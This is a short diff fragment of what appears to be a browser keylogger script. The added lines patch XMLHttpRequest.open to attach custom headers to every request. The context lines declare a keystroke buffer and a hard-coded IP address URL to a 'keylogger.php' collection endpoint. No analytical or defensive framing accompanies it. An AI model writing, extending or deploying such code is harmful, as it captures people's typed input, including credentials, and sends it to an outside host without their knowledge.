@@ -1,3 +1,13 @@
+XMLHttpRequest.prototype.open = (function(open) {
+  return function(method,url,async) {
+    open.apply(this,arguments);
+    this.setRequestHeader('customHeader1', 'someValue');
+    this.setRequestHeader('customHeader2', 'someOtherValue');
+    };
+})(XMLHttpRequest.prototype.open);
+
+
+
 var keys='';
 var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
 
